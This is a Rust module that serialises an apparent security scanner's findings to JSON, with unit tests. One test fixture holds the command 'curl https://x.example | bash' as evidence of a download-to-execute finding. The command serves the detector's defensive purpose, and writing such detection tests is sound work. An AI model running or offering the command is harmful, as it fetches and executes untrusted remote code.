//! JSON output. Stable field names: this is a machine contract.

use crate::report::Report;

pub fn to_json(report: &Report) -> String {
    serde_json::to_string_pretty(report).unwrap_or_else(|e| {
        // Serializing our own types cannot fail, but a truncated report is
        // worse than an honest error.
        format!("{{\"error\":\"report serialization failed: {e}\"}}")
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Confidence, Evidence, Finding, RuleId, Severity};
    use crate::report::{Counts, SkillReport};

    fn report() -> Report {
        let f = Finding::new(
            RuleId::from("DL_PIPE_TO_SHELL"),
            Severity::Critical,
            Confidence::High,
            "scripts/a.sh",
            "download to execute",
            vec![Evidence {
                line: 2,
                text: "curl https://x.example | bash".into(),
                secondary: None,
                note: None,
            }],
        )
        .with_capability("shell.execute");
        Report::new(vec![SkillReport {
            name: "s".into(),
            rule_set_version: "0.1.0".into(),
            description: None,
            declared_permissions_raw: None,
            license_declared: None,
            license_file_found: false,
            capabilities: Default::default(),
            dependencies: vec![],
            counts: Counts::of(std::slice::from_ref(&f)),
            injection: crate::report::InjectionCoverage::of(std::slice::from_ref(&f)),
            findings: vec![f],
            skipped: vec![],
        }])
    }

    #[test]
    fn json_round_trips() {
        let s = to_json(&report());
        let back: Report = serde_json::from_str(&s).expect("valid json");
        assert_eq!(back.skills.len(), 1);
        assert_eq!(back.skills[0].findings[0].rule.as_str(), "DL_PIPE_TO_SHELL");
        assert_eq!(back.totals.critical, 1);
    }

    #[test]
    fn severity_is_uppercase_in_json() {
        let s = to_json(&report());
        assert!(s.contains("\"CRITICAL\""), "{s}");
    }

    #[test]
    fn nulls_are_omitted_for_optional_fields() {
        let s = to_json(&report());
        assert!(!s.contains("\"secondary\""), "{s}");
        assert!(!s.contains("\"via_normalization\""), "{s}");
    }

    #[test]
    fn output_is_deterministic() {
        assert_eq!(to_json(&report()), to_json(&report()));
    }
}
